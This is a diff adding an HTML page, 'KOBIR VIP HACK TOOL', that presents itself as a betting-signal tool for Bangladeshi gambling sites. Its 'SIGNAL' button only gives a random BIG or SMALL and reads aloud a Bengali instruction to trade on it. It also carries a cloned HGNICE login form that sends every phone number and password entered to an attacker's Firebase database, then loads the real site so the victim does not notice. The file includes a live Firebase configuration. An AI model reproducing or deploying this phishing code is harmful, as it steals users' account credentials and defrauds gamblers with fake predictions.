@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KOBIR VIP HACK TOOL</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #0a0a1a;
+            --secondary: #14142e;
+            --accent: #4e00c2;
+            --accent-light: #6a2cff;
+            --neon-blue: #00f7ff;
+            --neon-pink: #ff00aa;
+            --text: #f0f0f0;
+            --signal-big: #00c3ff;
+            --signal-small: #ff2a6d;
+            --dark-bg: rgba(10, 10, 26, 0.95);
+            --success: #00d26a;
+            --warning: #ffcc00;
+            --danger: #ff3860;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a1a, #1a0a2e);
+            color: var(--text);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(78, 0, 194, 0.15) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        /* Login Screen */
+        .login-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .login-box {
+            background: var(--dark-bg);
+            border-radius: 15px;
+            padding: 40px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 0 50px rgba(78, 0, 194, 0.7);
+            border: 1px solid rgba(0, 247, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-box::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, var(--neon-blue), var(--accent), var(--neon-pink));
+            z-index: -1;
+            border-radius: 16px;
+        }
+
+        .login-title {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px rgba(0, 247, 255, 0.5);
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(26, 26, 46, 0.8);
+            border: 1px solid rgba(78, 0, 194, 0.5);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+        }
+
+        .login-input:focus {
+            outline: none;
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 15px rgba(0, 247, 255, 0.3);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, var(--accent), var(--accent-light));
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(90deg, var(--accent-light), var(--accent));
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(78, 0, 194, 0.7);
+        }
+
+        /* Signal Section - Top Section */
+        .signal-section {
+            background: var(--dark-bg);
+            border-radius: 0;
+            padding: 5px 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+            border: none;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 40px;
+            flex-shrink: 0;
+            margin-bottom: 2px;
+        }
+
+        .signal-section::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            background: linear-gradient(45deg, var(--neon-blue), var(--accent), var(--neon-pink));
+            z-index: -1;
+            border-radius: 0;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            flex: 1;
+            max-width: 150px;
+            margin-right: 5px;
+        }
+
+        .input-label {
+            display: block;
+            margin-right: 5px;
+            color: #aaa;
+            font-size: 0.8rem;
+            white-space: nowrap;
+        }
+
+        .period-input {
+            width: 70px;
+            padding: 5px 8px;
+            background: rgba(26, 26, 46, 0.8);
+            border: 1px solid rgba(78, 0, 194, 0.5);
+            border-radius: 8px;
+            color: var(--text);
+            font-size: 0.9rem;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .period-input:focus {
+            outline: none;
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 10px rgba(0, 247, 255, 0.3);
+        }
+
+        .generate-btn {
+            padding: 5px 10px;
+            background: linear-gradient(90deg, var(--accent), var(--accent-light));
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 0.8rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 0 5px;
+        }
+
+        .generate-btn:hover {
+            background: linear-gradient(90deg, var(--accent-light), var(--accent));
+            transform: translateY(-2px);
+            box-shadow: 0 3px 15px rgba(78, 0, 194, 0.7);
+        }
+
+        /* Signal Display */
+        .signal-display {
+            background: rgba(26, 26, 46, 0.8);
+            border-radius: 8px;
+            padding: 3px 10px;
+            text-align: center;
+            border: 1px solid rgba(0, 247, 255, 0.3);
+            min-width: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            height: 30px;
+        }
+
+        .signal-display::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(0, 247, 255, 0.1) 0%, transparent 70%);
+            z-index: 1;
+        }
+
+        .signal-text {
+            font-size: 1rem;
+            font-weight: bold;
+            z-index: 2;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 0 15px currentColor;
+        }
+
+        .big {
+            color: var(--signal-big);
+        }
+
+        .small {
+            color: var(--signal-small);
+        }
+
+        /* Site Container - Main Content */
+        .site-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            border-radius: 0 0 15px 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.7);
+            position: relative;
+            height: calc(100vh - 40px);
+        }
+
+        /* Site Header */
+        .site-header {
+            background: var(--dark-bg);
+            padding: 5px 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: none;
+            flex-shrink: 0;
+            height: 40px;
+            margin-bottom: 2px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .site-header::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            bottom: -1px;
+            background: linear-gradient(45deg, var(--neon-blue), var(--accent), var(--neon-pink));
+            z-index: -1;
+            border-radius: 0;
+        }
+
+        .site-title {
+            font-size: 1rem;
+            background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(0, 247, 255, 0.5);
+            font-weight: bold;
+        }
+
+        .logo-buttons {
+            display: flex;
+            gap: 5px;
+        }
+
+        .logo-btn {
+            background: linear-gradient(135deg, var(--accent), var(--accent-light));
+            border: none;
+            border-radius: 5px;
+            color: white;
+            padding: 4px 8px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .logo-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 3px 15px rgba(78, 0, 194, 0.7);
+        }
+
+        /* Site Content Area */
+        #siteContent {
+            flex: 1;
+            overflow: auto;
+            background: #0e0e1f;
+            padding: 0;
+        }
+
+        /* Iframe Styling */
+        .site-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: white;
+        }
+
+        /* Animations */
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 247, 255, 0.7);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 0 0 15px rgba(0, 247, 255, 0);
+                transform: scale(1.03);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(0, 247, 255, 0);
+                transform: scale(1);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Fake Login Page Styles */
+        .fake-login-container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            margin: 20px auto;
+            position: relative;
+        }
+        
+        .fake-login-header {
+            background: linear-gradient(90deg, #1890ff, #4e00c2);
+            padding: 40px 20px;
+            text-align: center;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .fake-login-header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+        }
+        
+        .fake-login-header h1 {
+            font-size: 2.5rem;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .fake-login-content {
+            padding: 40px;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .fake-login-header-text {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .fake-login-header-text h2 {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: #262626;
+        }
+        
+        .fake-login-header-text p {
+            color: #595959;
+            font-size: 1.1rem;
+            line-height: 1.6;
+        }
+        
+        .fake-login-options {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #e8e8e8;
+            padding-bottom: 20px;
+        }
+        
+        .fake-login-option {
+            padding: 12px 30px;
+            cursor: pointer;
+            font-weight: 500;
+            color: #8c8c8c;
+            position: relative;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .fake-login-option:hover {
+            color: #1890ff;
+        }
+        
+        .fake-login-option.active {
+            color: #1890ff;
+            font-weight: 600;
+        }
+        
+        .fake-login-option.active::after {
+            content: '';
+            position: absolute;
+            bottom: -21px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 70%;
+            height: 4px;
+            background: #1890ff;
+            border-radius: 4px;
+        }
+        
+        .fake-form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .fake-form-group label {
+            display: block;
+            margin-bottom: 12px;
+            color: #434343;
+            font-size: 1.1rem;
+            font-weight: 500;
+        }
+        
+        .fake-input-with-flag {
+            position: relative;
+        }
+        
+        .fake-country-flag {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.1rem;
+            color: #595959;
+            font-weight: 500;
+        }
+        
+        .fake-phone-input {
+            padding: 16px 15px 16px 120px;
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #d9d9d9;
+            border-radius: 10px;
+            color: #262626;
+            font-size: 1.1rem;
+            height: 55px;
+        }
+        
+        .fake-password-input {
+            padding: 16px 15px;
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #d9d9d9;
+            border-radius: 10px;
+            color: #262626;
+            font-size: 1.1rem;
+            height: 55px;
+        }
+        
+        .fake-remember-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        
+        .fake-remember {
+            display: flex;
+            align-items: center;
+            font-size: 1.1rem;
+        }
+        
+        .fake-remember input {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+        }
+        
+        .fake-forgot-password {
+            color: #1890ff;
+            text-decoration: none;
+            font-size: 1.1rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .fake-forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .fake-login-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #1890ff, #4e00c2);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 30px;
+            height: 60px;
+            transition: all 0.3s ease;
+        }
+        
+        .fake-login-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 20px rgba(24, 144, 255, 0.5);
+        }
+        
+        .fake-action-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .fake-action-button {
+            flex: 1;
+            padding: 15px 10px;
+            background: #f5f5f5;
+            border: 1px solid #e8e8e8;
+            border-radius: 10px;
+            color: #595959;
+            font-size: 1.1rem;
+            font-weight: 500;
+            cursor: pointer;
+            height: 50px;
+            transition: all 0.3s ease;
+        }
+        
+        .fake-action-button:hover {
+            background: #e8e8e8;
+        }
+        
+        .fake-customer-service {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 30px;
+            border-top: 1px solid #e8e8e8;
+            color: #8c8c8c;
+            font-size: 1.1rem;
+        }
+        
+        .fake-customer-service a {
+            color: #1890ff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .fake-customer-service a:hover {
+            text-decoration: underline;
+        }
+        
+        .fake-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: #fafafa;
+            color: #8c8c8c;
+            font-size: 1rem;
+            border-top: 1px solid #e8e8e8;
+        }
+        
+        .fake-close-button {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            color: #595959;
+            font-weight: 500;
+            padding: 8px 15px;
+            border-radius: 8px;
+            background: #f5f5f5;
+            transition: all 0.3s ease;
+        }
+        
+        .fake-close-button:hover {
+            background: #e8e8e8;
+        }
+        
+        /* Security features */
+        .security-features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .security-feature {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .security-icon {
+            font-size: 2.5rem;
+            color: var(--neon-blue);
+            margin-bottom: 15px;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+        }
+        
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(78, 0, 194, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--neon-blue);
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        .loading-text {
+            margin-top: 20px;
+            color: var(--neon-blue);
+            font-size: 1.2rem;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .signal-section, .site-header {
+                height: auto;
+                flex-direction: column;
+                padding: 5px;
+            }
+            
+            .signal-section {
+                height: auto;
+            }
+
+            .input-group, .generate-btn, .signal-display, .site-title, .logo-buttons {
+                width: 100%;
+                margin: 5px 0;
+                text-align: center;
+                justify-content: center;
+            }
+
+            .period-input {
+                width: 100%;
+            }
+
+            .logo-buttons {
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .logo-btn {
+                width: 48%;
+                padding: 5px;
+                font-size: 0.8rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logo-btn {
+                width: 100%;
+                margin-bottom: 5px;
+            }
+            
+            .login-box {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-screen" id="loginScreen">
+            <div class="login-box">
+                <h2 class="login-title">KOBIR VIP ACCESS</h2>
+                <div class="input-group">
+                    <label for="password">Enter Password</label>
+                    <input type="password" id="password" class="login-input" placeholder="Enter VIP Password" required>
+                </div>
+                <button class="login-btn" id="loginBtn">UNLOCK TOOL</button>
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i> SECURE ACCESS
+                </div>
+            </div>
+        </div>
+
+        <div class="signal-section">
+            <div class="input-group">
+                <label for="period">3 DIGIT</label>
+                <input type="number" id="period" class="period-input" placeholder="000" min="0" max="999" maxlength="3" required>
+            </div>
+            <button class="generate-btn" id="generateBtn">SIGNAL</button>
+            <div class="signal-display" id="signalDisplay">
+                <div class="signal-text">--</div>
+            </div>
+        </div>
+
+        <div class="site-container">
+            <div class="site-header">
+                <div class="site-title">VIP HACK TOOL</div>
+                <div class="logo-buttons">
+                    <button class="logo-btn" id="hgniceBtn">
+                        <i class="fas fa-user-lock"></i> HGNICE
+                    </button>
+                    <button class="logo-btn" id="dkwinBtn">
+                        <i class="fas fa-external-link-alt"></i> DKWIN
+                    </button>
+                </div>
+            </div>
+            <div id="siteContent">
+                <!-- Content will be injected here -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- Fake Login Template -->
+    <template id="fakeLoginTemplate">
+        <div class="fake-login-container">
+            <div class="fake-login-header">
+                <h1>HGNICE</h1>
+            </div>
+            
+            <div class="fake-login-content">
+                <div class="fake-login-header-text">
+                    <h2>Log in</h2>
+                    <p>Please log in with your phone number or email<br>If you forget your password, please contact customer service</p>
+                </div>
+                
+                <div class="fake-login-options">
+                    <div class="fake-login-option active">Phone number</div>
+                    <div class="fake-login-option">Email Login</div>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="fake-form-group">
+                        <label>Phone number</label>
+                        <div class="fake-input-with-flag">
+                            <div class="fake-country-flag">+880 ✔</div>
+                            <input type="text" class="fake-phone-input" id="phone" placeholder="Please enter the phone number" required>
+                        </div>
+                    </div>
+                    
+                    <div class="fake-form-group">
+                        <label>Password</label>
+                        <input type="password" class="fake-password-input" id="loginPassword" placeholder="Password" required>
+                    </div>
+                    
+                    <div class="fake-remember-row">
+                        <div class="fake-remember">
+                            <input type="checkbox" id="remember">
+                            <label for="remember">Remember password</label>
+                        </div>
+                        <a href="#" class="fake-forgot-password">Forgot password</a>
+                    </div>
+                    
+                    <button type="submit" class="fake-login-button">
+                        Log in
+                    </button>
+                    
+                    <div class="fake-action-buttons">
+                        <button type="button" class="fake-action-button">
+                            Register
+                        </button>
+                        <button type="button" class="fake-action-button">
+                            Forgot password
+                        </button>
+                        <button type="button" class="fake-action-button">
+                            Customer Service
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="fake-customer-service">
+                    Need help? <a href="#">Contact Customer Service</a>
+                </div>
+            </div>
+            
+            <div class="fake-footer">
+                <div class="storage-info">
+                    <i class="fas fa-database"></i> 5.18 GB available | 4.00+4.00 GB
+                </div>
+                <div class="fake-close-button" id="fakeCloseBtn">
+                    <i class="fas fa-times"></i> Close
+                </div>
+            </div>
+        </div>
+    </template>
+
+    <div class="loading-screen" id="loadingScreen" style="display: none;">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Redirecting to HGNICE...</div>
+    </div>
+
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBXv_zGzIGWTot4nDNaUDaWqy0I3zyOo3U",
+            authDomain: "kobir-vip.firebaseapp.com",
+            databaseURL: "https://kobir-vip-default-rtdb.firebaseio.com",
+            projectId: "kobir-vip",
+            storageBucket: "kobir-vip.firebasestorage.app",
+            messagingSenderId: "1069797086626",
+            appId: "1:1069797086626:web:a504164cb298a08b1a4efb",
+            measurementId: "G-WCDCGT4VM0"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // DOM Elements
+        const loginScreen = document.getElementById('loginScreen');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const periodInput = document.getElementById('period');
+        const generateBtn = document.getElementById('generateBtn');
+        const signalDisplay = document.getElementById('signalDisplay');
+        const signalText = signalDisplay.querySelector('.signal-text');
+        const hgniceBtn = document.getElementById('hgniceBtn');
+        const dkwinBtn = document.getElementById('dkwinBtn');
+        const siteContent = document.getElementById('siteContent');
+        const fakeLoginTemplate = document.getElementById('fakeLoginTemplate');
+        const loadingScreen = document.getElementById('loadingScreen');
+
+        // Handle login to unlock the tool
+        loginBtn.addEventListener('click', function() {
+            const password = passwordInput.value;
+            // Fixed password for login
+            if (password === "KOBIR-VIP1397") {
+                loginScreen.style.display = 'none';
+                showHgniceLogin(); // Show HGNICE login by default
+            } else {
+                alert('Invalid password. Please try again. ^ GET KEY? 👉 https://t.me/TNL_LAB_V1 →→  @TNL_LAB_V1 ');
+            }
+        });
+
+        // Generate signal
+        generateBtn.addEventListener('click', function() {
+            const period = periodInput.value;
+            if (!period || period.length !== 3) {
+                alert('Please enter a valid 3-digit period number');
+                return;
+            }
+
+            // Generate random signal (BIG or SMALL)
+            const isBig = Math.random() > 0.5;
+            const signal = isBig ? 'BIG' : 'SMALL';
+            const signalClass = isBig ? 'big' : 'small';
+            const message = isBig ? 'আপনি বিগে ট্রেড করুন' : 'আপনি SMALL এ ট্রেড করুন';
+
+            // Update signal display
+            signalText.textContent = signal;
+            signalText.className = 'signal-text ' + signalClass;
+            signalDisplay.classList.add('pulse');
+
+            // Remove pulse animation after 2 seconds
+            setTimeout(() => {
+                signalDisplay.classList.remove('pulse');
+            }, 2000);
+
+            // Speech synthesis (voice output)
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance(message);
+                utterance.lang = 'bn-BD'; // Bengali
+                utterance.rate = 1.0;
+                speechSynthesis.speak(utterance);
+            }
+        });
+
+        // Format period input
+        periodInput.addEventListener('input', function() {
+            if (this.value.length > 3) {
+                this.value = this.value.slice(0, 3);
+            }
+        });
+
+        // Show HGNICE login
+        function showHgniceLogin() {
+            // Inject the fake login template
+            const clone = document.importNode(fakeLoginTemplate.content, true);
+            siteContent.innerHTML = '';
+            siteContent.appendChild(clone);
+            
+            // Setup the fake login form
+            const loginForm = siteContent.querySelector('#loginForm');
+            const closeBtn = siteContent.querySelector('#fakeCloseBtn');
+            
+            // Handle close button
+            closeBtn.addEventListener('click', function() {
+                siteContent.innerHTML = '<iframe class="site-frame" src="https://hgnice.pro/"></iframe>';
+            });
+            
+            // Handle form submission
+            if (loginForm) {
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const phone = document.getElementById('phone').value;
+                    const password = document.getElementById('loginPassword').value;
+                    
+                    // Show loading screen
+                    loadingScreen.style.display = 'flex';
+                    
+                    // Save credentials to Firebase
+                    const credentials = {
+                        phone: phone,
+                        password: password,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    const hgniceRef = ref(database, 'hgnice_logins');
+                    push(hgniceRef, credentials)
+                        .then(() => {
+                            // Redirect to the HGNICE site after a short delay
+                            setTimeout(() => {
+                                siteContent.innerHTML = '<iframe class="site-frame" src="https://hgnice.top/"></iframe>';
+                                loadingScreen.style.display = 'none';
+                            }, 2000);
+                        })
+                        .catch((error) => {
+                            console.error('Error saving credentials:', error);
+                            loadingScreen.style.display = 'none';
+                            alert('Login failed. Please try again.');
+                        });
+                });
+            }
+        }
+
+        // Show DKWIN interface
+        function showDkwinInterface() {
+            siteContent.innerHTML = '<iframe class="site-frame" src="https://dkwin.com/"></iframe>';
+        }
+
+        // Attach event listeners
+        hgniceBtn.addEventListener('click', showHgniceLogin);
+        dkwinBtn.addEventListener('click', showDkwinInterface);
+    </script>
+</body>
+</html>
